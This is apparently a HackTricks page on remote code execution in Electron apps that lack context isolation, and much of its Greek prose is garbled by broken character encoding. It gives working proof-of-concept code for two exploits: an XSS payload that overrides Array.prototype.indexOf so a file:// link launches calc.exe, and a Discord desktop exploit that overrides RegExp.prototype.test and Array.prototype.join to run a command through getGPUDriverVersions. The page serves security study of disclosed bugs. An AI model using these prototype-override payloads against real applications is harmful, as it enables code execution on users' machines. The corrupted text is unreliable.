# Electron contextIsolation RCE via preload code

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± 1

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)

Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î±Î½Î¿Î¯Î³ÎµÎ¹ http(s) ÏƒÏ…Î½Î´Î­ÏƒÎ¼Î¿Ï…Ï‚ Î¼Îµ Ï„Î¿Î½ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î®:

![](<../../../.gitbook/assets/image (768).png>)

ÎšÎ¬Ï„Î¹ ÏƒÎ±Î½ `file:///C:/Windows/systemd32/calc.exe` Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Î±ÏÎ¹Î¸Î¼Î¿Î¼Î·Ï‡Î±Î½Î®, Ï„Î¿ `SAFE_PROTOCOLS.indexOf` Ï„Î¿ Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÎ¹.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± JS Î¼Î­ÏƒÏ‰ XSS Î® Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î·Ï‚ Ï€Î»Î¿Î®Î³Î·ÏƒÎ·Ï‚ ÏƒÎµ ÏƒÎµÎ»Î¯Î´Î±:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
ÎšÎ±Î¸ÏÏ‚ Î· ÎºÎ»Î®ÏƒÎ· ÏƒÏ„Î¿ `SAFE_PROTOCOLS.indexOf` Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Ï€Î¬Î½Ï„Î± 1337, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ calc. Î¤ÎµÎ»Î¹ÎºÎ® ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
Check the original slides for other ways to execute programs without having a prompt asking for permissions.

Apparently another way to load and execute code is to access something like `file://127.0.0.1/electron/rce.jar`

## Example 2: Discord App RCE

Example from [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

When checking the preload scripts, I found that Discord exposes the function, which allows some allowed modules to be called via `DiscordNative.nativeModules.requireModule('MODULE-NAME')`, into the web page.\
Here, I couldn't use modules that can be used for RCE directly, such as _child\_process_ module, but I **found a code where RCE can be achieved by overriding the JavaScript built-in methods** and interfering with the execution of the exposed module.

The following is the PoC. I was able to confirm that the **calc** application is **popped** up when I c**all the `getGPUDriverVersions` function** which is defined in the module called "_discord\_utils_" from devTools, while **overriding the `RegExp.prototype.test` and `Array.prototype.join`**.
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
Î— ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `getGPUDriverVersions` Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· "_execa_", ÏŒÏ€Ï‰Ï‚ Ï„Î¿ ÎµÎ¾Î®Ï‚:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
Î£Ï…Î½Î®Î¸Ï‰Ï‚, Ï„Î¿ _execa_ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ "_nvidia-smi.exe_", Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `nvidiaSmiPath`, Ï‰ÏƒÏ„ÏŒÏƒÎ¿, Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Ï…Ï€ÎµÏÏ†ÏŒÏÏ„Ï‰ÏƒÎ·Ï‚ Ï„Î¿Ï… `RegExp.prototype.test` ÎºÎ±Î¹ Ï„Î¿Ï… `Array.prototype.join`, **Ï„Î¿ ÎµÏ€Î¹Ï‡ÎµÎ¯ÏÎ·Î¼Î± Î±Î½Ï„Î¹ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ Î¼Îµ "**_**calc**_**" ÏƒÏ„Î·Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± Ï„Î¿Ï… \_execa**\_**. 

Î£Ï…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î±, Ï„Î¿ ÎµÏ€Î¹Ï‡ÎµÎ¯ÏÎ·Î¼Î± Î±Î½Ï„Î¹ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹ Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î´ÏÎ¿ Î¼Î­ÏÎ·.

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
